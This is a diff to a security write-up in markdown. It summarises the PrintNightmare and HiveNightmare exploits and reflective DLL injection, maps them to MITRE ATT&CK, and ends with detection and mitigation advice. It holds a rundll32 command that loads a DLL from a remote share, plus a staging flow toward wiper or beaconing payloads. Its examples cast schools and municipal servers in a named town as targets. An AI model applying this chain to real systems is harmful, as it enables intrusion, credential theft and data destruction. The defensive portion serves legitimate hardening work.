@@ -154,16 +154,88 @@ After identifying an exposed printer web interface or open SMB share via Google 
 ```
 ```
 
+````markdown
+# 🧩 HiveNightmare / Print Spooler Exploits  
+**Objective:** Leverage known vulnerabilities in Windows Print Spooler and shadow volume access to escalate privileges and gain unauthorized file access.  
 
-## HiveNightmare / Print Spooler Exploits: 
+- **CVE-2021-34527 (PrintNightmare):** Enables remote code execution via Print Spooler service by loading malicious DLLs using native API calls like `RpcAddPrinterDriverEx`.
+- **CVE-2021-1675:** Initially classified as LPE; later discovered to be RCE under certain configurations.
+- **CVE-2021-36934 (HiveNightmare):** Exposes `SAM`, `SYSTEM`, and `SECURITY` hives due to misconfigured ACLs on shadow copies, allowing non-admin users to dump password hashes and escalate.
 
-## Reflective Dll Injection: 
-
-## Mitre Attack Summary: 
-
-## Detection & Mitigation Strategy
+**Example (Post-Dork Recon – Moberly):**  
+If a school or municipal server in Moberly is running a vulnerable print service, the attacker can remotely trigger PrintNightmare to gain SYSTEM-level access or combine HiveNightmare for local hash extraction and lateral escalation.
 
 ---
+
+# 💉 Reflective DLL Injection  
+**Technique:** Load a malicious DLL directly into memory without touching disk using reflective loaders, avoiding AV/EDR detection.
+
+**Usage Flow:**  
+1. Stage DLL using LOLBins (`certutil`, `rundll32`, etc.).
+2. Load via reflective injection (e.g., Stephen Fewer's ReflectiveLoader).
+3. Execute memory-resident logic such as encryption, wiper payload, or command beaconing.
+
+**Example:**  
+```cmd
+rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
+````
+
+In the context of printer or public infrastructure compromise in Moberly, reflective injection enables stealthy post-exploitation using harvested credentials or lateral movement through mapped drives and spooler service APIs.
+
+---
+
+# 🧠 MITRE ATT\&CK Summary
+
+| Phase                | Technique                               | ID                   | Description                                              |
+| -------------------- | --------------------------------------- | -------------------- | -------------------------------------------------------- |
+| Initial Access       | Valid Accounts / Drive-by Compromise    | `T1078`, `T1189`     | Compromising public-facing print interfaces              |
+| Execution            | DLL Side-Loading / LOLBins              | `T1218`, `T1055.001` | Running DLLs reflectively via trusted binaries           |
+| Privilege Escalation | Print Spooler Exploits / Hive ACL Abuse | `T1068`, `T1003.002` | SYSTEM-level access and SAM hash extraction              |
+| Defense Evasion      | Fileless Execution / Obfuscated Files   | `T1027`, `T1202`     | Encoded payloads delivered via `certutil`, `mshta`, etc. |
+| Credential Access    | LSASS Dumping / SAM Hive Access         | `T1003`              | Credential dumping post HiveNightmare                    |
+| Lateral Movement     | SMB/Net Share Enumeration               | `T1021.002`          | Spread via printer shares or spooler enumeration         |
+| Impact               | Data Destruction / Encryption           | `T1485`, `T1486`     | Fileless wiperware triggered via DLL payloads            |
+
+---
+
+# 🛡️ Detection & Mitigation Strategy
+
+## 🔍 Detection
+
+* **Sysmon + Sigma Rules:**
+
+  * Monitor `rundll32.exe` loading non-system DLLs
+  * Watch for abnormal `certutil.exe`, `regsvr32.exe`, `mshta.exe` usage
+  * Track shadow copy access from non-admin users (HiveNightmare)
+
+* **SIEM Queries (e.g., ELK/Splunk):**
+
+  * Searches for execution from public shares (`\\UNC\path`)
+  * Parent-child process anomalies (`explorer.exe` → `rundll32.exe`)
+  * Base64/hex-encoded command usage in PowerShell or CMD
+
+## 🛡️ Mitigation
+
+* Disable Print Spooler on systems where not required:
+
+  ```cmd
+  Stop-Service -Name Spooler -Force
+  Set-Service -Name Spooler -StartupType Disabled
+  ```
+* Patch CVEs via Windows Update or GPO.
+* Apply ACL hardening to `C:\Windows\System32\config\` and disable shadow volume copy exposure.
+* Implement application control (AppLocker, WDAC) to restrict use of LOLBins.
+* Use endpoint solutions that detect **reflective loading behavior**, not just file signatures.
+
+---
+
+**Conclusion:**
+This full attack chain demonstrates how exposed infrastructure (e.g., in Moberly) can be exploited using fileless techniques, built-in binaries, and unpatched CVEs. Defensive teams should prioritize visibility into native tool abuse, privilege escalation paths, and encoded payload delivery patterns.
+
+```
+```
+
+
 
 ### ⚠️ Legal Disclaimer
 
